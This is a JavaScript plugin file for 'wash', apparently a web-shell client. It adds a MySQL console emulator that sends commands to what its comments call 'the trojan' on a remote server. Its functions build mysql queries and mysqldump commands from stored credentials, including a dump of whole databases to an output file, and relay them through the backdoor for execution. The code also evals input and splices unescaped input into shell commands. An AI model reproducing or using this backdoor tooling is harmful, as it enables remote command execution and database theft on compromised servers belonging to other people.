// Here we pop open the wash object once again to patch in some tailored
// functionality.
wash.mysql = {

    // buffer the raw SQL command for later use
    cmd: '',
    prompt: 'mysql>',

    // the help text
    help: function(args){
        // push the help objects onto the array
        var help_objects = [];
        help_objects.push({
            command : "wash.mysql.help()",
            text    : "Displays the help commands for the wash.mysql object.",
        })
        help_objects.push({
            command : "wash.mysql.connect({username: 'user', password: 'pass', database: 'db'})",
            text    : "Connects to the specified MySQL database.",
        })
        help_objects.push({
            command : "wash.mysql.disconnect()",
            text    : "Disconnects from the connected MySQL database.",
        })
        help_objects.push({
            command : "wash.mysql.dump(username: 'user', password: 'pass', database: 'db', outfile: 'out.sql')",
            text    : "Dumps the connected MySQL database to a specified outfile.",
        })
        help_objects.push({
            command : "wash.mysql.use({username: 'user', password: 'pass', database: 'db'})",
            text    : "USEs the database specified. Can be used to switch database connections.",
        })

        // output or return the help objects appropriately
        if(args != null && args.return === true){ return help_objects; }
        else { wash.help_display(help_objects); }
    },

    // buffer the database connection parameters
    connection: {
        username : 'root',
        password : 'root',
        database : '',
    },

    // buffer some objects when changing emulation modes
    old_objects: {
        history         : {},
        process_command : {},
        prompt          : '',
    },

    // this will begin an emulation of a mysql terminal
    connect: function(connection_parameters){
        // set the connection parameters
        // @todo: some kind of success-failure detection would be ideal
        wash.mysql.connection.username = connection_parameters.username;
        wash.mysql.connection.password = connection_parameters.password;
        wash.mysql.connection.database = connection_parameters.database;

        // get the mysql version information
        wash.mysql.get_version();

        // visually signify that we're entering an emulated session
        $('body').animate({ backgroundColor : '#E97B00' }, 500);

        // buffer the previous session's settings
        wash.mysql.old_objects.prompt = shell.prompt.context.get();
        shell.prompt.context.set(this.prompt);

        // buffer the previous process command - this is where the real "magic"
        // happens that makes this work
        wash.mysql.old_objects.process_command = wash.process; 

        // keep the mysql command history separate from the main history
        // (I'm just buffering the whole damn thing here, methods and all)
        wash.mysql.old_objects.history = $.extend(true, {}, shell.history); // deep copy
        shell.history.reset();

        // now, write a new function to process commands
        wash.process = function(command){
            // buffer the raw SQL command
            wash.mysql.cmd = command;

            // parse out the wash action
            if(shell.prompt.mode.get() == 'wash'){
                try{
                    eval(command);
                }catch(e){
                    shell.output.write('wash error: Invalid command.', 'output wash_error');
                }
            }

            // support the exit command
            else if(command == 'exit' || command == 'exit;'){
                wash.mysql.disconnect();
            }
            
            // if the prompt is not in wash mode, default to mysql action
            else {
                // @todo: remember to escape quotations here
                // command = ...
                 
                // emulate the mysql console just by running queries through the 
                // command line
                var cmd = 'mysql -t ';
                cmd += "-u'"       + wash.mysql.connection.username + "' ";
                cmd += "-p'"       + wash.mysql.connection.password + "' ";
                cmd += wash.mysql.connection.database               + " "; 
                cmd += "-e '"      + command                        + "'"; 

                // communicate with the trojan
                wash.command.action        = 'shell';
                wash.command.cmd           = cmd;
                wash.command.args.password = wash.connection.password;

                wash.net.send(function(){  
                    // display the output
                    if(wash.response.error != null){ shell.output.write(wash.response.error, 'output wash_error'); }
                    else { shell.output.write(wash.response.output, 'output'); }
                });
            }
        };
    },

    // disconnects from the terminal emulation
    disconnect: function(){
        shell.status.set('MySQL emulation terminated.');

        // animate back to the default terminal colors
        $('body').animate({ backgroundColor : '#708090' }, 500);

        // restore the old history
        shell.history = wash.mysql.old_objects.history;

        // restore the old process function
        wash.process = wash.mysql.old_objects.process_command;

        // restore the old prompt
        shell.prompt.context.set(wash.mysql.old_objects.prompt);
        shell.prompt.draw();
    },

    // dumps a mysql database
    dump: function(params){
        // assemble the dump command
        var cmd = 'mysqldump ';
        cmd += "-u'" +  wash.mysql.connection.username +  "' ";
        cmd += "-p'" +  wash.mysql.connection.password +  "' ";
        cmd += wash.mysql.connection.database          +  " "; 
        cmd += "> "  + params.outfile;

        // communicate with the trojan
        wash.command.action = 'shell';
        wash.command.cmd    = cmd;
        wash.net.send(function(){  
            // display output or error, depending on which was received
            if(wash.response.error != null){ shell.output.write(wash.response.error, 'output wash_error'); }
            else { shell.output.write(wash.response.output, 'output'); }
        });
    },

    // returns mysql client version information
    get_version: function(){
        // assemble the command to send to the trojan
        wash.command.action = 'shell';
        wash.command.cmd    = 'mysql -V';
        wash.command.args   = {} ;
        wash.net.send(function(){  
            shell.status.set('Emulating MySQL client. (' + wash.response.output + ')');
        });
    },

    // USEs a different mysql database
    use: function(connection_parameters){
        // re-map the connection strings
        if(connection_parameters.username != null){ wash.mysql.connection.username = connection_parameters.username; }
        if(connection_parameters.password != null){ wash.mysql.connection.password = connection_parameters.password; }
        if(connection_parameters.database != null){ wash.mysql.connection.database = connection_parameters.database; }

        // notify
        shell.output.write('wash: database connection parameters updated.', 'output wash_info');
    },
}
